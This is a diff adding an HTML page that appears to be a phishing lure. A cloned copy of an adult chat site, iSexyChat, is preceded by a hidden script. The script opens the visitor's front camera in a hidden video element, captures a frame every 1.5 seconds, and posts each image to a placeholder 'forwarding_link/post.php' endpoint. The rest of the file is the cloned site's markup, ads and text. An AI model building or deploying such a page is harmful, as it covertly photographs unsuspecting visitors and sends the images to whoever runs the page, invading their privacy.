@@ -1,0 +1,373 @@
+<!doctype html>
+<html>
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+        
+        <!DOCTYPE html>
+        <html lang="en-us">
+        <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Free Sex Chat Rooms - Live Cam Sex | iSexyChat</title>
+        <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+        '//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+        })(window,document,'script','dataLayer','GTM-KST94LL');</script>
+        <script async='async' src='https://www.googletagservices.com/tag/js/gpt.js'></script>
+        <script>
+          var googletag = googletag || {};
+          googletag.cmd = googletag.cmd || [];
+        </script>
+        <script>
+          googletag.cmd.push(function() {
+            
+            var hbannerMappingA = googletag.sizeMapping().
+              addSize([1688, 0], [728, 90]).
+              addSize([1366, 0], [728, 90]).
+              addSize([1200, 0], [728, 90]).
+              addSize([1024, 0], [728, 90]).
+              addSize([ 991, 0], [728, 90]).
+              addSize([ 768, 0], [728, 90]).
+              addSize([ 767, 0], [728, 90]).
+              addSize([ 360, 0], [320, 50]).
+              build();
+        
+            var hbannerMappingB = googletag.sizeMapping().
+              addSize([1688, 0], [728, 90]).
+              addSize([1366, 0], [728, 90]).
+              addSize([1200, 0], [728, 90]).
+              addSize([1024, 0], [728, 90]).
+              addSize([ 991, 0], [728, 90]).
+              addSize([ 768, 0], [728, 90]).
+              addSize([ 767, 0], [728, 90]).
+              addSize([ 360, 0], [300, 250]).
+              build();
+        
+            var gslots = [];
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_001_Home_1',                      [[320, 50], [728, 90]], 'div-gpt-ad-1539406461583-0').defineSizeMapping(hbannerMappingA).addService(googletag.pubads()));
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_002_Home_2',                      [[320, 50], [728, 90]], 'div-gpt-ad-1539406274564-0').defineSizeMapping(hbannerMappingA).addService(googletag.pubads()));
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_004_Rules_1',                     [[320, 50], [728, 90]], 'div-gpt-ad-1539406828913-0').defineSizeMapping(hbannerMappingA).addService(googletag.pubads()));
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_005_Rules_2',                     [[320, 50], [728, 90]], 'div-gpt-ad-1539406674012-0').defineSizeMapping(hbannerMappingA).addService(googletag.pubads()));
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_006_ChooseChatroom_1',            [[320, 50], [728, 90]], 'div-gpt-ad-1539407105055-0').defineSizeMapping(hbannerMappingA).addService(googletag.pubads()));
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_007_ChooseChatroom_2',            [[320, 50], [728, 90]], 'div-gpt-ad-1539406905196-0').defineSizeMapping(hbannerMappingA).addService(googletag.pubads()));
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_009_ChooseTargetGender_1',        [[320, 50], [728, 90]], 'div-gpt-ad-1539407408135-0').defineSizeMapping(hbannerMappingA).addService(googletag.pubads()));
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_010_ChooseTargetGender_2',        [[320, 50], [728, 90]], 'div-gpt-ad-1539407274314-0').defineSizeMapping(hbannerMappingA).addService(googletag.pubads()));
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_012_ChooseSourceGender_1',        [[320, 50], [728, 90]], 'div-gpt-ad-1539407718839-0').defineSizeMapping(hbannerMappingA).addService(googletag.pubads()));
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_013_ChooseSourceGender_2',        [[320, 50], [728, 90]], 'div-gpt-ad-1539407621540-0').defineSizeMapping(hbannerMappingA).addService(googletag.pubads()));
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_015_Chat_1',                      [[320, 50], [728, 90]], 'div-gpt-ad-1539407914008-0').defineSizeMapping(hbannerMappingA).addService(googletag.pubads()));
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_016_Chat_2',                      [[300,250], [728, 90]], 'div-gpt-ad-1539408034069-0').defineSizeMapping(hbannerMappingB).addService(googletag.pubads()));
+        
+            
+            
+            setInterval(function(){console.log("refresh ads");googletag.pubads().refresh();}, 60000);
+            
+        
+            
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_017_Chat_tabunder',               [1, 1], 'ISC_2018_017_Chat_tabunder').addService(googletag.pubads()));
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_003_Home_tabunder',               [1, 1], 'ISC_2018_003_Home_tabunder').addService(googletag.pubads()));
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_008_ChooseChatroom_tabunder',     [1, 1], 'ISC_2018_008_ChooseChatroom_tabunder').addService(googletag.pubads()));
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_011_ChooseTargetGender_tabunder', [1, 1], 'ISC_2018_011_ChooseTargetGender_tabunder').addService(googletag.pubads()));
+            gslots.push(googletag.defineSlot('/61176046/ISC_2018_014_ChooseSourceGender_tabunder', [1, 1], 'ISC_2018_014_ChooseSourceGender_tabunder').addService(googletag.pubads()));
+        
+            var utmRE = /^utm_/;
+            var metas = document.getElementsByTagName('head')[0].getElementsByTagName('meta')
+            for (var m = 0 ; m < metas.length ; m++) {
+              var name = metas[m].getAttribute('name');
+              var content = metas[m].getAttribute('content');
+              if ( utmRE.test(name) ) {
+                console.log("targeting: "+name+" = "+content);
+                for (var s = 0 ; s < gslots.length ; s++) {
+                  gslots[s].setTargeting(name, content);
+                }
+              }
+            }
+        
+            
+            googletag.enableServices();
+          });
+        </script>
+        <script src="https://isexychat.com/js/jquery.min.js"></script>
+        <script src="https://isexychat.com/js/bootstrap.min.js"></script>
+        <link rel="stylesheet" href="https://isexychat.com/css/bootstrap.css" />
+        <link rel="stylesheet" href="https://isexychat.com/css/stylesheet.css?x=20181221" />
+        <link rel="manifest" href="/manifest.json" />
+        <meta name="theme-color" content="#FF00A0" />
+        <meta name="description" content="Start sex chat for free online inside the sex chat rooms and uncover yourself. No login or registration required, just enter your name and start chatting with thousands of online chatters." />
+        <meta name="keywords" content="Free sex chat online, online sex chat rooms " />
+        <meta name="robots" content="index, follow" />
+        <meta name="utm_source" content="" />
+        <meta name="utm_term" content="" />
+        <meta name="utm_content" content="free sex chat rooms - live cam sex" />
+        <meta name="utm_medium" content="" />
+        <meta name="utm_campaign" content="" />
+        <meta property="og:title" content="Free Sex Chat Rooms - Live Cam Sex | iSexyChat" />
+        <meta property="og:type" content="website" />
+        <meta property="og:image" content="https://isexychat.com/images/girl.png" />
+        <meta property="og:url" content="/chatrooms/sex-chat/" />
+        <meta property="og:site_name" content="iSexyChat" />
+        <meta property="og:description" content="Start sex chat for free online inside the sex chat rooms and uncover yourself. No login or registration required, just enter your name and start chatting with thousands of online chatters." />
+        <meta property="og:locale" content="en_US" />
+        <meta name="twitter:creator" content="@isexychat" />
+        <meta name="twitter:domain" content="iSexyChat" />
+        <meta name="twitter:site" content="@isexychat" />
+        <meta name="twitter:title" content="Free Sex Chat Rooms - Live Cam Sex | iSexyChat" />
+        <meta name="twitter:card" content="summary" />
+        <meta name="twitter:description" content="Start sex chat for free online inside the sex chat rooms and uncover yourself. No login or registration required, just enter your name and start chatting with thousands of online chatters." />
+        <script type='application/ld+json'>{"@context":"http:\/\/schema.org","@type":"WebSite","url":"http:\/\/isexychat.com\/","name":"Free Sex Chat Rooms - Live Cam Sex | iSexyChat","alternateName":"Free Sex Chat Rooms - Live Cam Sex | iSexyChat","potentialAction":{"@type":"SearchAction","target":"http:\/\/isexychat.com\/?s={search_term_string}","query-input":"required name=search_term_string"}}</script>
+        <script type='application/ld+json'>{"@context":"http:\/\/schema.org","@type":"Organization","url":"http:\/\/isexychat.com\/","sameAs":["https:\/\/twitter.com\/isexychat"],"name":"iSexyChat","logo":"http:\/\/isexychat.com\/wp-content\/themes\/isexychat\/views\/assets\/img\/girl.png"}</script>
+        <meta name="google-site-verification" content="xVnVVxaNoI8O2LCP-eCMlI9pO789zhDmh9lVVKxRcSY" />
+        <meta name="ahrefs-site-verification" content="e5074a6941d1d4b5fe5a3551d000899558bb18a8a89d88210d8ad01ab0fcda89">
+        <link rel="canonical" href="https://isexychat.com/chatrooms/sex-chat/" />
+        </head>
+        <body>
+        <noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-KST94LL" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+        <nav class="navbar navbar-inverse main_nav">
+        <div class="container-fluid">
+        <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar" role="none" aria-label="iSexyChat">
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="https://isexychat.com/"><script type="text/javascript" style="display:none">
+        //<![CDATA[
+        window.__mirage2 = {petok:"64e48614966639487852ab93d9c8d657513895ce-1564698288-1800"};
+        //]]>
+        </script>
+        <script type="text/javascript" src="https://ajax.cloudflare.com/cdn-cgi/scripts/04b3eb47/cloudflare-static/mirage2.min.js"></script>
+        <img data-cfsrc="https://isexychat.com/images/logo.png" alt="logo" style="display:none;visibility:hidden;" /><noscript><img src="https://isexychat.com/images/logo.png" alt="logo" /></noscript></a>
+        </div>
+        <div class="collapse navbar-collapse" id="myNavbar">
+        <ul class="nav navbar-nav navbar-right navbar_menu">
+        <li><a href="https://isexychat.com/" target="_blank">Home</a></li>
+        <li><a href="https://isexychat.com/chatrooms/" target="_blank">Chat Rooms</a></li>
+        <li><a href="https://isexychat.com/rules/" target="_blank">Rules</a></li>
+        <li><a href="https://isexychat.com/blog/" target="_blank">Blog</a></li>
+        </ul>
+        </div>
+        </div>
+        </nav>
+        <div class="category_section">
+        <img data-cfsrc="https://isexychat.com/images/funnel/straight.jpg" alt="image" style="display:none;visibility:hidden;" /><noscript><img src="https://isexychat.com/images/funnel/straight.jpg" alt="image" /></noscript>
+        <div class="trade_banner">
+        <h1>Sex Chat</h1>
+        <div id="div-gpt-ad-1539407408135-0">
+        <script>
+        googletag.cmd.push(function() { googletag.display("div-gpt-ad-1539407408135-0"); });
+        </script>
+        </div>
+        <h3>I want to chat with...</h3>
+        <ul class="clearfix radio-btn">
+        <li class="active">
+        <a href="with-women/">
+        <figure><img data-cfsrc="https://isexychat.com/images/icon-women.png" alt="I like Women" style="display:none;visibility:hidden;" /><noscript><img src="https://isexychat.com/images/icon-women.png" alt="I like Women" /></noscript></figure>
+        <span>I like Women</span>
+        </a>
+        </li>
+        <li class="active">
+        <a href="with-men/">
+        <figure><img data-cfsrc="https://isexychat.com/images/icon-men.png" alt="I like Men" style="display:none;visibility:hidden;" /><noscript><img src="https://isexychat.com/images/icon-men.png" alt="I like Men" /></noscript></figure>
+        <span>I like Men</span>
+        </a>
+        </li>
+        <li class="active">
+        <a href="with-transgenders/">
+        <figure><img data-cfsrc="https://isexychat.com/images/icon-transgenders.png" alt="I like Transgender" style="display:none;visibility:hidden;" /><noscript><img src="https://isexychat.com/images/icon-transgenders.png" alt="I like Transgender" /></noscript></figure>
+        <span>I like Transgender</span>
+        </a>
+        </li>
+        <li class="active">
+        <a href="with-others/">
+        <figure><img data-cfsrc="https://isexychat.com/images/icon-others.png" alt="Something Else" style="display:none;visibility:hidden;" /><noscript><img src="https://isexychat.com/images/icon-others.png" alt="Something Else" /></noscript></figure>
+        <span>Something Else</span>
+        </a>
+        </li>
+        </ul>
+        <div id="div-gpt-ad-1539407274314-0">
+        <script>
+        googletag.cmd.push(function() { googletag.display("div-gpt-ad-1539407274314-0"); });
+        </script>
+        </div>
+        </div>
+        </div>
+        <div class="features_category">
+        <div class="container">
+        <div class="col-sm-6 no-padd">
+        <div class="chat_room">
+        <h2>When you&#39;re alone feeling hot and horny check out our sex chat</h2>
+        </div>
+        </div>
+        <div class="col-sm-6 no-padd">
+        <div class="chat_room_right">
+        <p>Live sex chat is great for adults who have some pent-up energy. In these sex chat rooms, you'll find other people who are feeling the same way as you are. You can choose to share in some real-time fun with them.</p>
+        <h2>Flirt for Free with New Sexy Chat Partners in Our Online Chatroom</h2>
+        <p>We've been told over the years that we offer the best live sex chat rooms. This is because we have a lot of people who stop in and do their part to chat and have fun. These are people of both genders, all sexual persuasions, and many different walks of life. The reason we tell you this is that with such a variety of people to choose from, you're bound to find someone who you feel matches up well with you and your unique personality.</p>
+        <p>When you choose to have free sex chat online with these people you're engaging in safe sex. You'll never have to worry about getting an STD or an STI because you're just having a lot of safe, real-time fun. This is one of the many reasons why people are continually telling us that they'd rather visit our chat rooms then go out to a bar or nightclub. At least here you can get as wild as you want without any unwanted repercussions later. This is something that will actually make the experience a lot more enjoyable for you and your partner in the long term.</p>
+        <p>Clearly there are a lot of great reasons why you should stop by and visit our online sex chat rooms. Of course, you'll never know just how much fun you really will have until you're in one of our chat rooms with us. We welcome you here and really look forward to sharing this new experience with you.</p>
+        </div>
+        </div>
+        </div>
+        </div>
+        <div class="section_subs">
+        <div class="container">
+        <h2>Want to Naughty Chat With Sexy New Friends?</h2>
+        <a href="https://isexychat.com/chatrooms/">Free Sex Chat Now</a>
+        </div>
+        </div>
+        <footer>
+        <div class="section_footer">
+        <div class="container">
+        <div class="col-md-3">
+        <figure> <img data-cfsrc="https://isexychat.com/images/footer-logo.png" alt="footer-logo" style="display:none;visibility:hidden;" /><noscript><img src="https://isexychat.com/images/footer-logo.png" alt="footer-logo" /></noscript></figure>
+        </div>
+        <div class="col-md-9">
+        <div class="footer-box">
+        <h5>In this section</h5>
+        <ul class="rep-show">
+        <li><a href="https://isexychat.com/">Home</a></li>
+        <li><a href="https://isexychat.com/chatrooms/">Chat Rooms</a></li>
+        <li><a href="https://isexychat.com/rules/">Rules</a></li>
+        <li><a href="https://isexychat.com/blog/">Blog</a></li>
+        <li><a href="https://isexychat.com/terms/">Terms &amp; Conditions</a></li>
+        </ul>
+        </div>
+        <div class="footer-box footer-box1">
+        <h5>Chat Rooms</h5>
+        <ul class="rep-show">
+        <li><a href="https://isexychat.com/chatrooms/sex-chat/">Sex Chat</a></li>
+        <li><a href="https://isexychat.com/chatrooms/gay-chat/">Gay Chat</a></li>
+        <li><a href="https://isexychat.com/chatrooms/lesbian-chat/">Lesbian Chat</a></li>
+        <li><a href="https://isexychat.com/chatrooms/roleplay-chat/">Roleplay Chat</a></li>
+        <li><a href="https://isexychat.com/chatrooms/general-chat/">General Chat</a></li>
+        <li><a href="https://isexychat.com/chatrooms/trade-skype-kik-etc/">Trade Skype/Kik/Etc</a></li>
+        <li><a href="https://isexychat.com/chatrooms/trade-pics/">Trade Pics</a></li>
+        </ul>
+        </div>
+        <div class="copyright_section">
+        <p>Copyright 2006-2019 iSexyChat.com. All rights reserved. Advertisers: Email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ddbcb9b0b4b39d">[email&#160;protected]</a></p>
+        </div>
+        </div>
+        </div>
+        </div>
+        <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
+        $(document).ready(function ($) {
+           
+          $(".footer-box h5").on("click",function(){
+            $(this).toggleClass("active").next().toggleClass("rep-show");
+            var h5s = $(this).parent(".footer-box").siblings().children("h5");
+            var h5cntnt = $(this).parent(".footer-box").siblings().children("h5").next()
+        
+            $(h5s).each(function(){
+              if ($(this).hasClass("active")){
+                $(this).removeClass("active")
+              }
+            });
+            $(h5cntnt).each(function(){
+              if (!$(this).hasClass("rep-show")) {
+                $(this).addClass("rep-show")
+              }
+            });
+          });
+        
+          $(".label_check1").click(function() {
+            if($(this).is(":checked")) {
+              $("#checking-email").slideDown();
+              
+            } else {
+              $("#checking-email").slideUp();
+              
+            }
+          });
+        });
+        </script>
+        </footer>
+        <script>
+          if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/service-worker.js?x=20181221')
+              .then(function(reg){
+                console.log("Service Worker Registered");
+              }).catch(function(err) {
+                console.log("Service Worker Failed: ", err)
+              });
+          }
+          </script>
+        </body>
+        </html>
+        
+    </body>
+
+</html>
